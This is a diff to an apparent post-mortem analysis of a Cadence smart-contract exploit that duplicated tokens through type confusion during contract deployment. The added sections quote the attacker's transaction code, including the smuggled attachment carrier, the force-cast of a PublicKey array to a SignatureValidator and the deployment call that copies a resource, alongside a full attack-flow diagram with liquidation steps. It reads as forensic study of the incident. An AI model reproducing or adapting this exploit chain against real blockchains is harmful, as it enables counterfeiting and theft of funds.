@@ -60,9 +60,12 @@ This mismatch allowed the attacker to **copy resources**, effectively counterfei
 The attacker:
 
 1. Obtained small amounts of 13 different tokens
-2. Deployed ~42 NFTPoolInstance contracts, each deployment duplicating the tokens
-3. Each duplication doubles the amount: 2^42 = **4,398,046,511,104** multiplier
-4. Result: 87.96 billion units per token duplicated
+2. **Seeded** the first pool contract (NFTPoolInstance0) with real tokens via normal deployment
+3. Deployed ~41 additional NFTPoolInstance contracts using the exploit, each duplicating the tokens
+4. Each duplication doubles the amount: 2^41 ≈ **2.2 trillion** multiplier
+5. Result: 87.96 billion units per token duplicated
+
+> **Note**: The first deployment (`deploy_pollinstance0.cdc`) uses **normal move semantics** (`<-`) to seed the attack with real tokens. Subsequent deployments (`deploy_pollinstance18` pattern) use the exploit to duplicate resources via type confusion.
 
 ---
 
@@ -77,6 +80,26 @@ The attacker:
 - Attachments were declared with certain static types
 - Actual runtime values had DIFFERENT types
 - The validator failed to reject these mismatches
+
+**The Carrier Mechanism** (discovered in `deploy_pollinstance18`):
+
+The exploit passes `NFTFactory.EmptyStruct` as a transaction argument:
+
+```cadence
+transaction(code: String, contractName: String, nextContractName: String, argContainer: NFTFactory.EmptyStruct) {
+    prepare(acct: auth(Storage, AddContract) &Account) {
+        // Get reference to the argContainer (which contains the smuggled KeyManager attachment)
+        let argContainerRef: &NFTFactory.EmptyStruct = &argContainer as &NFTFactory.EmptyStruct
+        
+        // EXPLOIT: Access the KeyManager attachment that was smuggled via type confusion
+        // This attachment should be impossible to create normally (its init() panics)
+        let keyManagerAttachment = argContainerRef[NFTFactory.KeyManager]!
+        // ...
+    }
+}
+```
+
+The `EmptyStruct` acts as a **carrier** for the smuggled `KeyManager` attachment. Since attachments weren't validated on import, the attacker could craft transaction arguments where the EmptyStruct already had the KeyManager attached—bypassing the `panic("0")` in KeyManager's init().
 
 **Evidence in Code**: `NFTFactory.cdc` contains two attachments with `panic()` in their initializers:
 
@@ -111,6 +134,22 @@ The `panic()` calls prove these attachments were designed **exclusively** for th
 3. The runtime skipped deep validation
 4. A resource was successfully hidden inside a value type
 
+**The Type Confusion Cast** (discovered in `deploy_pollinstance18`):
+
+```cadence
+// EXPLOIT: Extract KeyList from the smuggled KeyManager attachment
+let keyList = keyManagerAttachment.getKeyList(refSelf: keyManagerAttachment as &NFTFactory.KeyManager)
+
+// EXPLOIT: Cast the PublicKey to SignatureValidator (type confusion!)
+// The "PublicKey" is actually hiding a SignatureValidator attachment
+let signatureValidatorRef = (&keyList.keys[0] as &PublicKey) as! &NFTFactory.SignatureValidator
+
+// EXPLOIT: Point the SignatureValidator's reference to our ResourceManager
+signatureValidatorRef.setSignatureAlgorithm(refSelf: signatureValidatorRef, ref: managerRef as &NFTFactory.ResourceManager)
+```
+
+The `keys` array is declared as `[PublicKey]`, but actually contains `SignatureValidator` attachments. The force-cast (`as!`) reveals this type confusion—something that should fail if the types matched their declarations.
+
 **Evidence in Code**: `NFTFactory.cdc` contains:
 
 ```cadence
@@ -123,7 +162,7 @@ access(all) struct KeyList {
 }
 ```
 
-The `PublicKey` array provided the vector for smuggling resources inside structs.
+The `PublicKey` array provided the vector for smuggling the `SignatureValidator` (which holds a reference to `ResourceManager`) inside what the static type system treats as a struct.
 
 ---
 
@@ -131,14 +170,30 @@ The `PublicKey` array provided the vector for smuggling resources inside structs
 
 **Vulnerability**: When deploying contracts via `account.contracts.add()`, the runtime did not verify that the static types of initializer arguments matched the contract's init parameter types. Only dynamic types were checked.
 
-**Exploitation**:
+**Two-Phase Deployment Pattern**:
 
-1. Attacker prepared a `ResourceWrapper` containing token vaults
-2. Through Parts 1 & 2, this resource was disguised as a struct (statically)
-3. When passed to contract deployment:
-   - Calling context saw a STRUCT → applied **copy** semantics
-   - Contract init saw a RESOURCE → stored it normally
-   - **Result**: Resource was duplicated
+**Phase 1 - Seeding** (`deploy_pollinstance0.cdc`): The first pool is deployed with real tokens using normal move semantics:
+
+```cadence
+// Normal deployment - tokens are MOVED (not copied)
+let wrapper <- NFTFactory.wrapResource(argResource: <- vaults)
+acct.contracts.add(name: contractName, code: code.utf8, <- wrapper)
+```
+
+**Phase 2 - Exploitation** (`deploy_pollinstance18`): Subsequent pools use type confusion to duplicate:
+
+```cadence
+// EXPLOIT: Deploy next pool contract with the ResourceManager's rawValue
+// Due to type confusion, this resource will be COPIED instead of MOVED, duplicating it!
+acct.contracts.add(name: nextContractName, code: code.utf8, keyList.keys[0].signatureAlgorithm.rawValue)
+```
+
+The key is `keyList.keys[0].signatureAlgorithm.rawValue`:
+- `keyList.keys[0]` — statically a `PublicKey`, but actually a `SignatureValidator`
+- `.signatureAlgorithm` — a `&ResourceManager` reference (set via `setSignatureAlgorithm`)
+- `.rawValue` — the `@ResourceWrapper` containing token vaults
+
+The static type chain goes through struct/value types, so **copy semantics** are applied. But the actual value is a **resource**, which gets duplicated!
 
 **Evidence in Code**: `NFTPoolInstance0.cdc`:
 
@@ -407,6 +462,100 @@ access(all) fun withdrawResource(account: auth(Storage) &Account): @NFTFactory.R
 
 ---
 
+## Transaction Analysis: Deployment Transactions
+
+The attack used two distinct transaction patterns for deploying pool contracts:
+
+### deploy_pollinstance0.cdc - The Seed Transaction
+
+**Purpose**: Seeds the first pool contract with real tokens using normal, legitimate Cadence semantics.
+
+**Parameters**:
+
+| Parameter     | Type       | Description                                    |
+| ------------- | ---------- | ---------------------------------------------- |
+| `code`        | `String`   | Contract bytecode for NFTPoolInstance          |
+| `contractName`| `String`   | Name of the pool contract to deploy            |
+| `identifiers` | `[String]` | Storage path identifiers for source vaults     |
+| `amounts`     | `[UFix64]` | Amounts to withdraw from each vault            |
+
+**Execution Flow**:
+
+1. Verify salt matches (authorization check)
+2. Withdraw specified amounts from token vaults in storage
+3. Wrap all vaults into a ResourceWrapper
+4. Deploy pool contract with **move semantics** (`<- wrapper`)
+
+```cadence
+// This is LEGITIMATE - tokens are MOVED, not copied
+let wrapper <- NFTFactory.wrapResource(argResource: <- vaults)
+acct.contracts.add(name: contractName, code: code.utf8, <- wrapper)
+```
+
+This transaction is **not an exploit**—it's the setup phase that seeds the attack with real tokens.
+
+---
+
+### deploy_pollinstance18 - The Exploitation Transaction
+
+**Purpose**: Duplicates resources by exploiting type confusion when deploying subsequent pool contracts.
+
+**Parameters**:
+
+| Parameter          | Type                    | Description                                     |
+| ------------------ | ----------------------- | ----------------------------------------------- |
+| `code`             | `String`                | Contract bytecode for next pool instance        |
+| `contractName`     | `String`                | Current pool contract to extract from           |
+| `nextContractName` | `String`                | Next pool contract to deploy with duplicated resources |
+| `argContainer`     | `NFTFactory.EmptyStruct`| **Carrier for smuggled KeyManager attachment**  |
+
+**The Complete Exploit Chain in One Transaction**:
+
+```
+┌─────────────────────────────────────────────────────────────────────┐
+│           deploy_pollinstance18 - COMPLETE EXPLOIT FLOW              │
+├─────────────────────────────────────────────────────────────────────┤
+│                                                                      │
+│  1. EXTRACT from current pool                                        │
+│     poolContract.withdrawResource(account: acct)                     │
+│     └─► ResourceWrapper containing token vaults                      │
+│                                                                      │
+│  2. MERGE with any existing vaults in storage                        │
+│     └─► Consolidate all duplicated tokens                            │
+│                                                                      │
+│  3. STORE as ResourceManager                                         │
+│     let newManager <- NFTFactory.createManager(wrapper: <- wrapper)  │
+│     acct.storage.save(<- newManager, to: NFTFactory.getStoragePath())│
+│                                                                      │
+│  4. ACCESS SMUGGLED ATTACHMENT (Part 1)                              │
+│     let keyManagerAttachment = argContainerRef[NFTFactory.KeyManager]│
+│     └─► Attachment exists despite init() panicking!                  │
+│                                                                      │
+│  5. TYPE CONFUSION CAST (Part 2)                                     │
+│     let keyList = keyManagerAttachment.getKeyList(...)               │
+│     let signatureValidatorRef = (&keyList.keys[0] as &PublicKey)     │
+│                                  as! &NFTFactory.SignatureValidator  │
+│     └─► PublicKey is actually SignatureValidator!                    │
+│                                                                      │
+│  6. POINT TO RESOURCE                                                │
+│     signatureValidatorRef.setSignatureAlgorithm(ref: managerRef)     │
+│     └─► SignatureValidator now references our ResourceManager        │
+│                                                                      │
+│  7. DUPLICATE VIA DEPLOYMENT (Part 3)                                │
+│     acct.contracts.add(name: nextContractName,                       │
+│                        code: code.utf8,                              │
+│                        keyList.keys[0].signatureAlgorithm.rawValue)  │
+│                        ↑                                             │
+│     Static type: struct chain → COPY semantics applied               │
+│     Actual type: @ResourceWrapper → RESOURCE DUPLICATED!             │
+│                                                                      │
+└─────────────────────────────────────────────────────────────────────┘
+```
+
+This single transaction combines all three parts of the exploit to duplicate tokens with each pool contract deployment.
+
+---
+
 ## Transaction Analysis: rogue_mint.cdc
 
 **Purpose**: Extraction transaction to collect duplicated tokens from pool contracts and storage.
@@ -549,46 +698,62 @@ nftMetadata = {
 
 ## Complete Attack Flow Summary
 
-The following is a reconstruction based on the official post-mortem and analysis of the deployed contracts. Steps marked with ⚠️ are inferred from contract structure.
+The following is a reconstruction based on the official post-mortem and analysis of the deployed contracts, including the newly discovered deployment transactions.
 
 ```
 ┌─────────────────────────────────────────────────────────────────────┐
 │                      COMPLETE ATTACK FLOW                            │
 ├─────────────────────────────────────────────────────────────────────┤
 │                                                                      │
-│  1. PREPARATION (confirmed)                                          │
-│     ├── Deploy attack contracts (40+ contracts deployed)            │
-│     ├── Obtain small amounts of 13 target tokens                    │
-│     └── Create ResourceWrapper containing token vaults              │
+│  1. PREPARATION                                                      │
+│     ├── Deploy NFTFactory.cdc (core exploit infrastructure)         │
+│     ├── Deploy NFTPoolInterface.cdc (interface for pool contracts)  │
+│     ├── Deploy HotspotNFT.cdc (vault container)                     │
+│     └── Obtain small amounts of 13 target tokens                    │
 │                                                                      │
-│  2. CRAFT MALFORMED TRANSACTION ARGUMENTS (confirmed mechanism)     │
-│     ├── Part 1: Exploit attachment validation bypass                │
-│     ├── Part 2: Use PublicKey (built-in) to skip defensive checks  │
-│     └── ⚠️ Exact structure inferred from contracts                  │
+│  2. SEED PHASE (deploy_pollinstance0.cdc)                            │
+│     ├── Withdraw tokens from storage vaults                         │
+│     ├── Wrap into ResourceWrapper                                   │
+│     ├── Deploy NFTPoolInstance0 with MOVE semantics (<-)            │
+│     └── Real tokens now stored in first pool contract               │
 │                                                                      │
-│  3. ACHIEVE TYPE CONFUSION (confirmed)                               │
-│     ├── Runtime treats value as struct (copy semantics)            │
-│     └── Actual value contains resource (should be move semantics)  │
+│  3. CRAFT MALFORMED TRANSACTION ARGUMENTS                            │
+│     ├── Create EmptyStruct with smuggled KeyManager attachment      │
+│     │   (bypasses init() panic via attachment validation bypass)    │
+│     ├── KeyManager contains KeyList with "PublicKey" array          │
+│     │   (actually SignatureValidator - bypasses built-in checks)    │
+│     └── SignatureValidator holds reference slot for ResourceManager │
 │                                                                      │
-│  4. DUPLICATE VIA CONTRACT DEPLOYMENT (confirmed)                    │
-│     ├── Part 3: account.contracts.add() static/dynamic mismatch    │
-│     ├── Struct semantics → argument COPIED                         │
-│     ├── Resource received → stored in new contract                 │
-│     └── RESOURCE DUPLICATED!                                        │
+│  4. DUPLICATION LOOP (deploy_pollinstance18 pattern)                 │
+│     ┌─────────────────────────────────────────────────────────────┐ │
+│     │  FOR EACH subsequent pool contract (1 to ~41):              │ │
+│     │                                                              │ │
+│     │  a) Extract ResourceWrapper from previous pool              │ │
+│     │  b) Merge with any existing resources in storage            │ │
+│     │  c) Create ResourceManager, save to storage                 │ │
+│     │  d) Access smuggled KeyManager from EmptyStruct argument    │ │
+│     │  e) Cast "PublicKey" to SignatureValidator (type confusion) │ │
+│     │  f) Point SignatureValidator's reference to ResourceManager │ │
+│     │  g) Deploy next pool with:                                  │ │
+│     │     keyList.keys[0].signatureAlgorithm.rawValue             │ │
+│     │     ↓                                                        │ │
+│     │     Static: struct chain → COPY semantics                   │ │
+│     │     Actual: @ResourceWrapper → RESOURCE DUPLICATED!         │ │
+│     │                                                              │ │
+│     │  RESULT: Each iteration DOUBLES the token amounts           │ │
+│     └─────────────────────────────────────────────────────────────┘ │
+│     └── ~41 iterations = 2^41 ≈ 2.2 trillion multiplier             │
 │                                                                      │
-│  5. REPEAT ~42 TIMES (confirmed)                                     │
-│     ├── Each iteration doubles the tokens                          │
-│     ├── 2^42 = 4,398,046,511,104 multiplication                    │
-│     └── All amounts are multiples of 2^42                          │
+│  5. EXTRACTION (rogue_mint.cdc)                                      │
+│     ├── Verify salt matches (authorization check)                   │
+│     ├── Withdraw from each pool contract                            │
+│     ├── Unwrap ResourceWrappers to get token vaults                 │
+│     └── Deposit duplicated tokens to attacker's storage vaults      │
 │                                                                      │
-│  6. EXTRACTION (confirmed)                                           │
-│     ├── Withdraw from pool contracts                                │
-│     └── Deposit duplicated tokens to attacker's vaults             │
-│                                                                      │
-│  7. LIQUIDATION (confirmed)                                          │
-│     ├── Transfer to exchange deposit addresses                     │
-│     ├── Swap on DEXs (IncrementFi, KittyPunch)                     │
-│     └── Bridge off-network (Celer, deBridge, Stargate)             │
+│  6. LIQUIDATION                                                      │
+│     ├── Transfer to exchange deposit addresses                      │
+│     ├── Swap on DEXs (IncrementFi, KittyPunch)                      │
+│     └── Bridge off-network (Celer, deBridge, Stargate)              │
 │                                                                      │
 └─────────────────────────────────────────────────────────────────────┘
 ```
@@ -622,15 +787,24 @@ The following is a reconstruction based on the official post-mortem and analysis
 
 ---
 
-## Appendix: Contract File Summary
+## Appendix: File Summary
+
+### Contracts
 
 | File                   | Lines | Purpose                        |
 | ---------------------- | ----- | ------------------------------ |
-| `NFTFactory.cdc`       | 227   | Core exploit infrastructure    |
+| `NFTFactory.cdc`       | 229   | Core exploit infrastructure    |
 | `HotspotNFT.cdc`       | 144   | Token vault container          |
 | `NFTPoolInterface.cdc` | 30    | Pool contract interface        |
 | `NFTPoolInstance0.cdc` | 82    | Duplication point (one of ~42) |
-| `rogue_mint.cdc`       | 153   | Extraction transaction         |
+
+### Transactions
+
+| File                       | Lines | Purpose                                    |
+| -------------------------- | ----- | ------------------------------------------ |
+| `deploy_pollinstance0.cdc` | 29    | Seed transaction - deploys first pool with real tokens |
+| `deploy_pollinstance18.cdc`| 72    | Exploit transaction - duplicates via type confusion |
+| `rogue_mint.cdc`           | 153   | Extraction transaction - collects duplicated tokens |
 
 ---
 
